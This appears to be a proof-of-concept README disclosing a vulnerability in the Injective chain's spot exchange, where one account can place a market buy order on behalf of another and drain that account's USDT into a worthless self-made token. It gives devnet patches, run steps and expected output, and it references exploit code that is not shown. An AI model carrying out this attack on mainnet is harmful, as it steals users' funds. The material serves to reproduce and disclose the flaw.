**Test Environment**

Ubuntu Server 24.04 LTS

Dependency installation:

```sh
sudo apt update
sudo apt install golang

# Add Go Binaries to PATH
echo -e '\nexport GOPATH=$(go env GOPATH)\nexport PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc && source ~/.bashrc
```

**What does this PoC do?**

1. Uses the gov module to set the min notional for USDT. (On mainnet, USDT is already the quote token, so this has already been done there.)
2. User1 creates a FAKE token and mints some to himself.
3. User1 creates a FAKE/USDT spot market.
4. User1 places a limit sell order on the FAKE/USDT spot market at an arbitrary price.
5. User1 places a market buy order ***on behalf of User2*** to fill his own sell order. (User1 can set any account/price/quantity.)

As a result, User1 can steal all of User2's USDT, and User2 is left with worthless FAKE tokens.

**PoC Steps**

1. Download the Injective source code

    ```sh
    # To prevent Injective from force-modifying the historical code, we forked the injective-core repository.
    # You can also use the official repository: https://github.com/InjectiveFoundation/injective-core.git
    git clone https://github.com/injective-wall-of-shame/injective-core.git
    cd injective-core
    git checkout v1.17.0
    ```

2. Apply the patch to `scripts/local-genesis/initial_exchange_genesis.json`. This patch is necessary because the default devnet configuration does not allow creating spot markets directly. We adjust it to use mainnet parameters instead. This patch is only needed for the local devnet. mainnet does not require this change.

    ```diff
    diff --git a/scripts/local-genesis/initial_exchange_genesis.json b/scripts/local-genesis/initial_exchange_genesis.json
    index f97020a..eef2f9f 100644
    --- a/scripts/local-genesis/initial_exchange_genesis.json
    +++ b/scripts/local-genesis/initial_exchange_genesis.json
    @@ -3,14 +3,14 @@
        "params": {
        "spot_market_instant_listing_fee": {
            "denom": "inj",
    -        "amount": "1000000000000000000000"
    +        "amount": "20000000000000000000"
        },
        "derivative_market_instant_listing_fee": {
            "denom": "inj",
            "amount": "1000000000000000000000"
        },
    -      "default_spot_maker_fee_rate": "-0.000100000000000000",
    -      "default_spot_taker_fee_rate": "0.001000000000000000",
    +      "default_spot_maker_fee_rate": "-0.000050000000000000",
    +      "default_spot_taker_fee_rate": "0.000500000000000000",
        "default_derivative_maker_fee_rate": "-0.000100000000000000",
        "default_derivative_taker_fee_rate": "0.001000000000000000",
        "default_initial_margin_ratio": "0.050000000000000000",
    @@ -32,7 +32,7 @@
            "denom": "inj",
            "amount": "100000000000000000000"
        },
    -      "minimal_protocol_fee_rate": "0.000050000000000000",
    +      "minimal_protocol_fee_rate": "0.000001000000000000",
        "is_instant_derivative_market_launch_enabled": true,
        "post_only_mode_blocks_amount": 2000,
        "min_post_only_mode_downtime_duration": "DURATION_10M",
    ```

3. (Optional) Apply the patch to `injective-chain/modules/exchange/keeper/params.go`. This disables the post-only mode check so you can run the PoC immediately. If you skip this patch, you will need to wait for the devnet to produce 1000 blocks before running the PoC. Note that this restriction does not apply on mainnet, since mainnet has already surpassed 1000 blocks.

    ```diff
    diff --git a/injective-chain/modules/exchange/keeper/params.go b/injective-chain/modules/exchange/keeper/params.go
    index f0e7a9c..5b5a0b0 100644
    --- a/injective-chain/modules/exchange/keeper/params.go
    +++ b/injective-chain/modules/exchange/keeper/params.go
    @@ -223,5 +223,6 @@ func (k *Keeper) SetParams(ctx sdk.Context, params v2.Params) {
    }

    func (k *Keeper) IsPostOnlyMode(ctx sdk.Context) bool {
    -       return k.GetParams(ctx).PostOnlyModeHeightThreshold > ctx.BlockHeight()
    +       // return k.GetParams(ctx).PostOnlyModeHeightThreshold > ctx.BlockHeight()
    +       return false // This patch is optional. If you skip this patch, you will need to wait for the devnet to produce 1000 blocks before running the PoC.
    }
    ```

4. Copy the [`main.go`](main.go) file to `injective-core/poc/main.go`.
5. Build and start the local devnet

    ```sh
    make install
    rm -rf .injectived # clear previous runs
    ./setup.sh
    ./injectived.sh
    ```

6. Open a new terminal and run the PoC

    ```sh
    cd injective-core
    go run poc/main.go
    ```

7. Expected output

    ```sh
    $ go run poc/main.go
    Please input the passphrase: 12345678
    Enter keyring passphrase (attempt 1/3):
    Tx resp: tx_response:<txhash:"7ABABD132A6771EF74FA3717BFAA89248A23BFE9ABDA88AEF22D69D39216240B" > 
    Tx resp: tx_response:<txhash:"C9854FEDFB1A0A4325685BC16E3221E8D2E5C0A72FACA3F43641BCFE6F7B34E1" > 
    Proposal Status: PROPOSAL_STATUS_VOTING_PERIOD, voting period: 2026-03-11 11:51:50.464435061 +0000 UTC to 2026-03-11 11:52:00.464435061 +0000 UTC
    Waiting for voting period to end...
    Proposal Status: PROPOSAL_STATUS_PASSED, voting period: 2026-03-11 11:51:50.464435061 +0000 UTC to 2026-03-11 11:52:00.464435061 +0000 UTC
    Tx resp: tx_response:<txhash:"F630351456347DF7FC642A88C4826A1FCA1405BC286432D295AA57B181089AD3" > 
    Tx resp: tx_response:<txhash:"CF6DC697CCE8F07F95B3D38ED6B7D4880BFAABF8574058D9363B292654DB753C" > 
    user1 USDT balance: 100000000000000000000000000
    user2 USDT balance: 100000000000000000000000000
    Tx resp: tx_response:<txhash:"486B3FB3987EA02772D5558EB96BD78A52E2B7D8E4316D2903A7BFA5BEA78A32" > 
    Tx resp: tx_response:<txhash:"E0886638B461FEFAFC9183345AE8ED79A5D6335FF7CEF5EDD0B093CABC9495D4" > 
    user1 USDT balance: 100000010002500000000000000
    user2 USDT balance: 99999989995000000000000000
    ```
